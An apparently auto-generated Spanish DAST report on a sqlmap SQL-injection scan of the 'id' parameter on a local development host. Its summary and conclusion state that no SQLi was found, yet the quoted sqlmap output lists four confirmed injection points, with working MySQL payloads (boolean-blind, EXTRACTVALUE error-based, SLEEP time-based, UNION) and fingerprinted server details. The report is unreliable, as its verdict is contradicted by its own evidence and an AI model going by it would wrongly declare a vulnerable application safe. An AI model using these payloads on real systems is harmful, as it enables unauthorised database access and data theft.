# Informe DAST SQLi - 2026-04-13T10:55:25

**Resumen Ejecutivo**
- No se detectaron vulnerabilidades SQLi automáticas con sqlmap en el objetivo http://web.dev.local:8083/?id=1.

**Vectores Analizados**
- GET parameter: id (URL: http://web.dev.local:8083/?id=1)

**Comandos y Payloads**
Initial sqlmap command:
\n```
sqlmap -u "http://web.dev.local:8083/?id=1" --batch --level=2 --risk=1
```

**Evidencia (extractos relevantes)**
\n```
=== sqlmap initial scan (últimas 200 líneas) ===
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.10.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:55:25 /2026-04-13/

[10:55:25] [INFO] resuming back-end DBMS 'mysql' 
[10:55:25] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=2352' OR NOT 7247=7247#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=2352' AND EXTRACTVALUE(4611,CONCAT(0x5c,0x7176627171,(SELECT (ELT(4611=4611,1))),0x7171767871))-- EpGx&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=2352' AND (SELECT 8276 FROM (SELECT(SLEEP(5)))fFmn)-- zOtb&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=2352' UNION ALL SELECT CONCAT(0x7176627171,0x72427059744f476b4d78544e587a484175417453704154766b554d6c5077574f6c754a7245786d58,0x7171767871),NULL#&Submit=Submit
---
[10:55:26] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 8.1.33, Apache 2.4.65
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[10:55:26] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/web.dev.local'

[*] ending @ 10:55:26 /2026-04-13/

```

**Conclusión**
- No se identificaron vulnerabilidades SQLi con las pruebas automatizadas ejecutadas.

**Metodología**
Se ejecutaron pruebas automatizadas con sqlmap (--batch) sobre el parámetro identificado en la página raíz.
